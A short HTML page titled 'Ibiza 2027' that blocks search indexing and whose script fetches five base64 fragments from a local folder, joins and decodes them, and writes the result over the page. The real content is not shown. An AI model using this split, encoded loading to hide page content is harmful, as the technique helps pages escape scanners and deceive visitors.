<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow,noarchive"><title>Ibiza 2027</title></head><body><script>(async()=>{const files=['p1.txt','p2.txt','p3.txt','p4.txt','p5.txt'];const b64=(await Promise.all(files.map(f=>fetch('./parts/'+f).then(r=>r.text())))).join('');const bytes=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));const html=new TextDecoder().decode(bytes);document.open();document.write(html);document.close();})();</script></body></html>
